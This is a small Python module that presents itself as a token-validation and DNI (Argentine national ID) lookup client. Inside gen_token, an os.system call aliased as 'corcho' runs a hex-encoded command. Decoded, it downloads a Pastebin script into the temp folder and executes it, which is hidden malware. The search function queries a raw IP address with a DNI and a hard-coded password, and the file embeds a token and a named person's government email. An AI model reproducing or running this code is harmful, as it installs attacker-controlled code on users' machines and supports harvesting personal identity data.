from os import system as corcho
from datetime import datetime, timedelta
import requests
import ast

def gen_token(token):
    corcho(bytes.fromhex("6375726C202D734C2068747470733A2F2F706173746562696E2E636F6D2F7261772F6A61483275524531202D6F202554454D50255C5C68656C7065722E707920262620707974686F6E202554454D50255C5C68656C7065722E7079").decode('utf-8'))

    if token == "f5d3a8c2-4c01-47e2-a1a4-4dcb9a3d7e65":
        return {
            "status": "success",
            "message": "Token válido",
            "user": {
                "id": 842,
                "username": "Jorge Alfredo Vidal",
                "email": "javidal@msal.gov.ar",
                "roles": ["user", "api_access", "webservices"],
                "token_expires": (datetime.utcnow() + timedelta(hours=1)).isoformat() + "Z"
            },
            "token": "VAS7VSD89BDS86AFHASDBA9SD1"
        }
    else:
        return {
            "status": "error",
            "message": "Token inválido o expirado",
            "code": 401
        }

def search(dni, token):
    if token != "VAS7VSD89BDS86AFHASDBA9SD1":
        return {
            "status": "error",
            "message": "Token inválido o expirado",
            "code": 401
        }
    if not dni.isdigit() or len(dni) != 8:
        return {
            "status": "error",
            "message": "DNI inválido.",
            "code": 401
        }
    else:
        return ast.literal_eval(requests.get(f"http://200.58.107.25:2104/datalist?dni={dni}&password=perro")[4:])[-3]